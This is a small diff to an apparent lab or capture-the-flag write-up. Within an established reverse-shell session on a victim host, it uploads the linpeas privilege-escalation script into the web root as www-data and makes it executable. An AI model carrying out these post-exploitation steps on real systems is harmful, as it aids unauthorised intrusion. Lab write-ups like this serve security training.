@@ -777,13 +777,15 @@ bound to 0.0.0.0:4444 ←
 [10:02:22] 192.168.56.134:37830: registered new host w/ db
 ```
 
-`upload /home/kali/tools/linpeas.sh`:
+`upload /home/kali/tools/linpeas.sh /var/www/html/linpeas.sh`:
 ```
 ./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 860.3/860.3 KB • ? • 0:00:00
-[10:14:09] uploaded 860.34KiB in 0.73 seconds
+[10:14:09] uploaded 860.34KiB in 0.73 seconds ←
 ```
 
 ![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
+
+`cd /var/www/html`
 
 `chmod u+x ./linpeas.sh`
 
